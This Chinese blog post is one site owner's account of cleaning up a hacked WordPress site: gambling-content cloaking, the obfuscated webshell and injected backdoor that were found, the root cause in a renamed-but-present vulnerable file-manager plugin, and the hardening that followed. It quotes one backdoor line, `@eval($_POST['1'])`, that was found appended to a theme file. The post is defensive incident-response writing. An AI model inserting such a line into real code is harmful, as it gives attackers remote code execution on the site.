## 网站被黑挂马两次，我把整个应急过程写出来了

上个月，我的网站 chongbaotong.com（一个跑在阿里云 ECS 上的猫粮比价站，宝塔面板 + WordPress）被黑了。

发现的方式挺恶心：朋友告诉我，百度搜我的站名，快照里全是赌博内容。我自己打开网站看，一切正常。后来才知道，这种手法叫 cloaking——给搜索引擎的爬虫看一套，给正常访客看另一套。站长自己往往是最后一个知道的。

接下来两周，我清了两次马，才把事情真正解决。第一次清完我以为结束了，几天后又复发。第二次我把根因挖出来、做了整套加固，到现在稳了一个月。整个过程我记了完整的笔记，写出来给同样遇到这事的人。

### 第一次清理：找到了马，但没找到门

第一轮扫描，找到两个东西：

- `wp-content/languages/zxvsg.php`，161KB，整个文件用 goto 混淆，是个 webshell
- 主题里的 `404.php`，末尾被塞了一行 `@eval($_POST['1'])`

删掉，扫一遍，干净了。我以为结束了。

几天后，赌博快照又回来了。这次我学乖了，不急着删文件，先想一个问题：**马是怎么进来的？** 不找到门，删多少次都是替黑客除草。

### 根因：一个被我"改名禁用"的插件

查来查去，根因是 wp-file-manager 这个文件管理插件的已知漏洞。问题出在我自己的操作上：我很久以前就不用它了，但我没有卸载，只是把它的目录改了个名（加了个 `.DISABLED` 后缀），以为这样就"禁用"了。

事实是：**改名不影响这个插件的漏洞代码被直接通过 URL 访问。** 攻击者根本不需要登录后台，直接请求插件目录下的漏洞文件就能进。最后我把整个目录用 `sudo mv` 彻底移出 plugins，再访问，返回 404，这条路才算断。

这是我学到的第一件事：**"禁用"不等于"不存在"。不用的插件和主题，删干净，别改名。**

### 加固：只清理不加固，等于给黑客留门

第二次清理后，我做了一整套加固。不是装个安全插件点几下那种，是一条一条对着攻击路径堵：

1. **wp-config.php 加两行**：`DISALLOW_FILE_EDIT` 和 `DISALLOW_FILE_MODS`。意思是就算攻击者拿到后台登录，也不能通过后台在线改任何 PHP 文件、装任何插件。两行配置，把最常见的一条提权路径直接焊死
2. **REST API 用户枚举收口**：WordPress 默认的 `/wp-json/wp/v2/users` 会把所有用户名泄露出去，攻击者拿到用户名就只剩密码要猜。这里我踩了个坑：先在 nginx 里写规则拦截，发现没用——**nginx 的 location 只匹配路径，看不到 `?rest_route=` 这种 query 参数**，换个写法就绕过去了。最后改成 nginx 拦一种、PHP 里 `add_filter` 禁一种，双保险（这段的完整技术细节见[另一篇踩坑记](02-nginx拦不住rest_route-REST加固踩坑.md)）
3. **?author=1 重定向**：另一条用户名枚举路径，PHP 侧 301 跳走
4. **安全响应头**：X-Frame-Options、X-Content-Type-Options、Referrer-Policy 三个，nginx 加上
5. **登录限速**：nginx 层面对 wp-login 限每秒请求数，防爆破

做完之后跑了 7 项检查（常见泄露文件、危险文件、xmlrpc、插件版本泄露、漏洞插件路径、首页），全部通过。

### 几句实话

整个过程花了我两个周末。事后看，有几个判断对站长可能有用：

- **发现被黑的最好办法不是自己看网站，是定期用搜索引擎的爬虫视角看。** 很多马对正常访客完全隐身
- **清理之前先备份。** 我每删一个文件之前都留了副本，后来真有一个文件（189KB 的主题 index.php）我一开始怀疑是后门，查完发现是静态快照，又放了回去
- **复发不是马没删干净，是门没找到。** 两次清理的本质区别就在这里
- **网上那些"一键杀毒"的插件，对这种定向注入基本没用**，它们查的是库里的已知马，而我这个 161KB 的 goto 混淆壳是现写的

### 最后

我把自己这次的完整应急流程（怎么查马、怎么找根因、怎么加固、每步用什么命令）整理成了一份 runbook，就在[这个仓库的 runbook 目录](../runbook/README.md)（持续整理中）。如果你也是宝塔 + WordPress，站刚被黑，对着这份流程走一遍，大概率能自己解决。

**另外我想验证一件事：这样的应急流程，能不能做成一个真正一键的工具，让完全不懂安全的站长也能用。** 所以我打算**免费帮 10 个被黑的站做清理**，过程脱敏写成案例，继续完善 runbook 和工具。
